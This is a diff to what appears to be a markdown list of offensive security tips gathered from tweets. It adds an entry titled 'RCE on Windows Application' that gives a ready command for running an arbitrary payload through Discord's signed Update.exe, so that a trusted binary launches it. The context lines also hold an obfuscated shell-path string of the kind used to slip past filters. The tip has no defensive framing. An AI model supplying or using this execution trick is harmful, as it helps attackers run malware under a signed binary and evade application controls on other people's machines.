@@ -41,3 +41,18 @@ $sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsi
 ![img](https://pbs.twimg.com/media/EyMKkZWVEAAInk9?format=png&name=small)
 ![img](https://pbs.twimg.com/media/EyMKkZXUYAIaclN?format=png&name=large)
 ***Source: https://twitter.com/sec715/status/1378957974790492160?s=20***
+
+# 📅 07-Apr-2021
+## RCE on Windows Application
+
+Copy your payload into `%userprofile%\AppData\Local\Discord\Current\`
+
+Then
+
+```cmd
+%userprofile%\AppData\Local\Discord\Update.exe --processStart payload.exe --process-start-args "whatever args"
+```
+
+Trusted signed binary will run the payload for you Smiling face with smiling eyes
+
+***Source: https://twitter.com/smelly__vx/status/1379519938197655566?s=20***
